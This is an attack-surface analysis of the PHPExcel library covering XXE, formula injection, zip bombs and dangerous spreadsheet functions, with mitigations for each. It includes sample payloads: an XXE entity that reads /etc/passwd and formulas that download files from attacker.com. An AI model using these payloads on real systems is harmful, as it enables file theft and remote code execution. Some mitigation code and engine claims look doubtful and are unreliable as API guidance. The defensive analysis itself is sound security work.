# Attack Surface Analysis for phpoffice/phpexcel

## Attack Surface: [XML External Entity (XXE) Injection](./attack_surfaces/xml_external_entity__xxe__injection.md)

*   **1. XML External Entity (XXE) Injection**

    *   **Description:** Exploits vulnerabilities in XML parsers to access local files, internal network resources, or cause denial of service.
    *   **How PHPExcel Contributes:** PHPExcel uses PHP's XML parsing capabilities to process `.xlsx` (Open XML) files, making it susceptible if the parser isn't configured securely.
    *   **Example:**
        *   Attacker uploads an `.xlsx` file containing:
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>
            ```
        *   When PHPExcel processes this, it attempts to resolve the `xxe` entity, reading the contents of `/etc/passwd`.
    *   **Impact:**
        *   Information Disclosure (reading sensitive files).
        *   Server-Side Request Forgery (SSRF).
        *   Denial of Service (DoS).
    *   **Risk Severity:** **Critical**
    *   **Mitigation Strategies:**
        *   **Disable External Entity Resolution:** *Before* any PHPExcel operations, use `libxml_disable_entity_loader(true);`. This is the *most crucial* step.  Ensure this is done globally for the application, not just within the PHPExcel-related code.
        *   **Verify XML Parser Configuration:** Double-check that your PHP configuration (`php.ini`) doesn't have settings that override the `libxml_disable_entity_loader` call.
        *   **Use Up-to-Date PHP:** Ensure you are using a recent, patched version of PHP.

## Attack Surface: [Formula Injection (CSV Injection)](./attack_surfaces/formula_injection__csv_injection_.md)

*   **2. Formula Injection (CSV Injection)**

    *   **Description:** Injecting malicious formulas into spreadsheet cells that execute when the file is opened in a spreadsheet application (e.g., Excel, Google Sheets).  This is a *client-side* attack, not a server-side one.
    *   **How PHPExcel Contributes:** If PHPExcel is used to *generate* spreadsheets with user-supplied data, and that data isn't properly sanitized, it can create files vulnerable to formula injection.
    *   **Example:**
        *   User inputs `=HYPERLINK("http://attacker.com/malware.exe","Click Me")` into a web form.
        *   The application, using PHPExcel, inserts this directly into a cell without sanitization.
        *   When the generated spreadsheet is opened, the user sees "Click Me," and clicking it downloads and potentially executes `malware.exe`.
    *   **Impact:**
        *   Client-Side Code Execution (macros, JavaScript).
        *   Data Exfiltration (from the client's spreadsheet).
        *   Phishing.
    *   **Risk Severity:** **High** (because it affects end-users, not the server directly).
    *   **Mitigation Strategies:**
        *   **Prefix with Single Quote:** *Always* prepend a single quote (`'`) to any user-supplied data that is inserted into a cell and *might* start with `=`, `+`, `-`, or `@`.  This forces Excel to treat the value as text.  Example:  If user input is `=1+1`, store it as `'=1+1`.
        *   **Escape Special Characters:** Escape other special characters as needed for the specific spreadsheet format.
        *   **Input Validation (Limited):** Validate user input to *restrict* the allowed characters, but don't rely on this as the primary defense.  Focus on the single quote prefix.
        *   **User Education:** Warn users about the risks of opening spreadsheets from untrusted sources.

## Attack Surface: [Zip Bomb (Decompression Bomb)](./attack_surfaces/zip_bomb__decompression_bomb_.md)

*   **3. Zip Bomb (Decompression Bomb)**

    *   **Description:** A highly compressed archive file that expands to a massive size, overwhelming server resources.
    *   **How PHPExcel Contributes:** `.xlsx` files are ZIP archives. PHPExcel needs to decompress these files to process them.
    *   **Example:**
        *   An attacker uploads a specially crafted `.xlsx` file that is only a few kilobytes in size but expands to many gigabytes when decompressed.
    *   **Impact:**
        *   Denial of Service (DoS) – exhausting memory, disk space, and CPU.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   **Strict File Size Limits:** Enforce a maximum file size limit *before* passing the file to PHPExcel.  Implement this at multiple levels:
            *   Web server configuration (e.g., `LimitRequestBody` in Apache, `client_max_body_size` in Nginx).
            *   PHP configuration (`upload_max_filesize`, `post_max_size`).
            *   Application code (check file size before processing).
        *   **Resource Limits:** Configure PHP with appropriate resource limits (e.g., `memory_limit`, `max_execution_time`).
        *   **Temporary File Handling:** Ensure temporary files created during processing are properly cleaned up, even if an error occurs.

## Attack Surface: [Unsafe Function Calls within Loaded Files](./attack_surfaces/unsafe_function_calls_within_loaded_files.md)

* **4. Unsafe Function Calls within Loaded Files**
    * **Description:** Exploiting the ability of PHPExcel to execute worksheet functions to run arbitrary code.
    * **How PHPExcel Contributes:** PHPExcel's calculation engine can evaluate formulas within loaded spreadsheets.
    * **Example:**
        * An attacker uploads an .xlsx file containing a cell with the formula `=CALL("urlmon","URLDownloadToFileA","JJCCBBBB","https://attacker.com/evil.php", "C:\evil.php", 0, 0)`. If the calculation engine is enabled and not properly sandboxed, this could download and potentially execute a malicious PHP file.
    * **Impact:**
        * Remote Code Execution (RCE).
    * **Risk Severity:** **Critical**
    * **Mitigation Strategies:**
        * **Disable Calculation Engine:** If formula evaluation is not required, disable the calculation engine entirely: `$spreadsheet->getCalculationEngine()->setCalculationEngine(null);`
        * **Whitelist Allowed Functions:** If formula evaluation is needed, create a strict whitelist of allowed functions and enforce it. Do *not* allow potentially dangerous functions like `CALL`, `REGISTER`, or external file access functions.
        * **Sandboxing (Advanced):** Consider running the calculation engine in a sandboxed environment (e.g., using a separate process with limited privileges, a container, or a virtual machine) to isolate it from the main application and the server's file system.
        * **Input Validation (Limited):** While you can't fully validate the *contents* of a formula for malicious intent, you can validate the file extension and MIME type. This is a defense-in-depth measure.

